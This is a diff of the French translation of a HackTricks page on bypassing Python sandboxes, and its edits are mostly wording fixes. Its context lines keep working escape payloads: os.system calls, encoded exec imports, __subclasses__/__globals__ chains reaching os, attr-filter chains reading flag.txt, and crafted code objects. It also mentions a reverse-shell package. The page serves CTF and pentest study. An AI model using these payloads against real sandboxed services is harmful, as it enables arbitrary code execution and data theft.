@@ -8,15 +8,15 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -26,7 +26,7 @@ Voici quelques astuces pour contourner les protections des sandbox Python et ex�
 
 ## Bibliothèques d'exécution de commandes
 
-La première chose à savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pouvez importer l'une de ces bibliothèques :
+La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pouvez importer l'une de ces bibliothèques :
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -65,7 +65,7 @@ N'oubliez pas que les fonctions _**open**_ et _**read**_ peuvent être utiles po
 La fonction **Python2 input()** permet d'exécuter du code Python avant que le programme ne plante.
 {% endhint %}
 
-Python essaie de **charger les bibliothèques à partir du répertoire actuel en premier** (la commande suivante affichera d'où Python charge les modules): `python3 -c 'import sys; print(sys.path)'`
+Python essaie de **charger les bibliothèques depuis le répertoire actuel en premier** (la commande suivante affichera d'où Python charge les modules): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
@@ -107,13 +107,13 @@ Vous pouvez télécharger le package pour créer le shell inversé ici. Veuillez
 Ce package s'appelle `Reverse`. Cependant, il a été spécialement conçu de sorte que lorsque vous quittez le shell inversé, le reste de l'installation échouera, donc vous **ne laisserez aucun package python supplémentaire installé sur le serveur** lorsque vous partirez.
 {% endhint %}
 
-## Évaluation du code python
+## Évaluation du code Python
 
 {% hint style="warning" %}
-Notez que exec autorise les chaînes multilignes et ";", mais eval ne le fait pas (vérifiez l'opérateur walrus)
+Notez que exec autorise les chaînes multilignes et le point-virgule, mais eval ne le permet pas (vérifiez l'opérateur walrus)
 {% endhint %}
 
-Si certains caractères sont interdits, vous pouvez utiliser la représentation **hex/octal/B64** pour **contourner** la restriction:
+Si certains caractères sont interdits, vous pouvez utiliser la représentation **hexadécimale/octale/Base64** pour **contourner** la restriction:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -134,7 +134,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Autres bibliothèques permettant d'évaluer du code Python
+### Autres bibliothèques permettant d'évaluer du code python
 ```python
 #Pandas
 import pandas as pd
@@ -159,7 +159,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Contourner les protections à travers les encodages (UTF-7)
 
-Dans [**ce compte rendu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) l'UTF-7 est utilisé pour charger et exécuter du code Python arbitraire à l'intérieur d'un sandbox apparent :
+Dans [**ce compte rendu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) l'UTF-7 est utilisé pour charger et exécuter du code Python arbitraire à l'intérieur d'un sandbox apparent:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -174,7 +174,7 @@ Il est également possible de contourner cela en utilisant d'autres encodages, p
 
 ## Exécution Python sans appels
 
-Si vous êtes à l'intérieur d'une prison Python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes** arbitraires.
+Si vous êtes à l'intérieur d'une prison Python qui **ne vous permet pas de passer des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes** arbitraires.
 
 ### RCE avec [décorateurs](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -204,7 +204,7 @@ Si vous pouvez **déclarer une classe** et **créer un objet** de cette classe, 
 
 #### RCE avec des classes personnalisées
 
-Vous pouvez modifier certaines **méthodes de classe** (_en écrasant des méthodes de classe existantes ou en créant une nouvelle classe_) pour les faire **exécuter du code arbitraire** lorsqu'elles sont **déclenchées** sans les appeler directement.
+Vous pouvez modifier certaines **méthodes de classe** (_en écrasant des méthodes de classe existantes ou en créant une nouvelle classe_) pour leur faire **exécuter du code arbitraire** lorsqu'elles sont **déclenchées** sans les appeler directement.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -399,7 +399,7 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Globaux et locaux
+## Variables globales et locales
 
 Vérifier les **`globals`** et **`locals`** est un bon moyen de savoir à quoi vous pouvez accéder.
 ```python
@@ -431,7 +431,7 @@ Ici, je veux expliquer comment découvrir facilement **plus de fonctionnalités 
 
 #### Accéder aux sous-classes avec des contournements
 
-Une des parties les plus sensibles de cette technique est de pouvoir **accéder aux sous-classes de base**. Dans les exemples précédents, cela a été fait en utilisant `''.__class__.__base__.__subclasses__()`, mais il existe **d'autres moyens possibles**:
+Une des parties les plus sensibles de cette technique est la capacité à **accéder aux sous-classes de base**. Dans les exemples précédents, cela a été fait en utilisant `''.__class__.__base__.__subclasses__()`, mais il existe **d'autres moyens possibles**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -459,18 +459,18 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Trouver les bibliothèques dangereuses chargées
+### Recherche de bibliothèques dangereuses chargées
 
 Par exemple, en sachant qu'avec la bibliothèque **`sys`** il est possible d'**importer des bibliothèques arbitraires**, vous pouvez rechercher tous les **modules chargés qui ont importé sys à l'intérieur d'eux**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Il y en a beaucoup, et **nous en avons juste besoin d'un seul** pour exécuter des commandes :
+Il y en a beaucoup, et **nous en avons juste besoin d'un** pour exécuter des commandes :
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Nous pouvons faire la même chose avec **d'autres bibliothèques** que nous savons pouvoir être utilisées pour **exécuter des commandes**:
+Nous pouvons faire la même chose avec **d'autres bibliothèques** que nous savons pouvoir être utilisées pour **exécuter des commandes** :
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -559,7 +559,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche récursive des fonctions intégrées, des variables globales...
 
 {% hint style="warning" %}
-C'est tout simplement **génial**. Si vous **cherchez un objet tel que globals, builtins, open ou tout autre chose**, utilisez ce script pour **rechercher de manière récursive les endroits où vous pouvez trouver cet objet.**
+C'est tout simplement **génial**. Si vous **cherchez un objet tel que globals, builtins, open ou tout autre chose**, utilisez ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet**.
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -684,7 +684,7 @@ Vous pouvez vérifier la sortie de ce script sur cette page :
 
 ## Chaîne de format Python
 
-Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder à **l'information interne de python**. Vous pouvez utiliser les exemples précédents pour accéder aux globaux ou aux fonctions intégrées par exemple.
+Si vous **envoyez** une **chaîne** à Python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder aux **informations internes de Python**. Vous pouvez utiliser les exemples précédents pour accéder aux globaux ou aux fonctions intégrées par exemple.
 
 {% hint style="info" %}
 Cependant, il y a une **limitation**, vous ne pouvez utiliser que les symboles `.[]`, donc vous **ne pourrez pas exécuter de code arbitraire**, juste lire des informations.\
@@ -739,7 +739,7 @@ Consultez également la page suivante pour des gadgets qui vont **lire des infor
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Charges utiles de divulgation d'informations sensibles
+### Charges de divulgation d'informations sensibles
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -778,7 +778,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` et `func_globals` (identiques) permettent d'obtenir l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, certaines variables globales et leur contenu déclaré:
+`__globals__` et `func_globals` (identiques) obtiennent l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, certaines variables globales et leur contenu déclaré:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -787,7 +787,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Voir ici plus d'endroits pour obtenir des variables globales**](./#globals-and-locals)
+[**Voir ici plus d'endroits pour obtenir des globales**](./#globals-and-locals)
 
 ### **Accès au code de la fonction**
 
@@ -879,7 +879,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Notez que **si vous ne pouvez pas importer `dis` dans le bac à sable Python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et le **désassembler** localement. Vous ne verrez pas le contenu des variables chargées (`LOAD_CONST`) mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable chargée.
+Notez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et le **désassembler** localement. Vous ne verrez pas le contenu des variables chargées (`LOAD_CONST`) mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable chargée.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -903,7 +903,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilation de Python
 
-Maintenant, imaginons que vous puissiez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **l'exécuter**.\
+Maintenant, imaginons que d'une manière ou d'une autre, vous puissiez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **exécuter**.\
 Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le drapeau** (_imaginez une fonction `calc_flag` plus complexe_).
 ```python
 def get_flag(some_input):
@@ -939,7 +939,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Selon la version de Python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de Python que vous exécutez est d'exécuter :
+Selon la version de python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de python que vous exécutez est d'exécuter :
 ```
 import types
 types.CodeType.__doc__
@@ -964,7 +964,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Contourner les défenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code Python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout en **une seule ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code Python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout en une **seule ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la machine **CTF** (par exemple parce que nous n'avons pas la fonction `compile` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
@@ -994,7 +994,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Si vous ne pouvez pas accéder à `eval` ou `exec`, vous pourriez créer une **fonction appropriée**, mais l'appeler directement échouera généralement avec : _constructeur non accessible en mode restreint_. Vous avez donc besoin d'une **fonction qui n'est pas dans l'environnement restreint pour appeler cette fonction.**
+Si vous ne pouvez pas accéder à `eval` ou `exec`, vous pouvez créer une **fonction appropriée**, mais l'appeler directement échouera généralement avec : _constructeur non accessible en mode restreint_. Vous avez donc besoin d'une **fonction qui n'est pas dans l'environnement restreint pour appeler cette fonction.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1039,7 +1039,7 @@ seront contournés
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
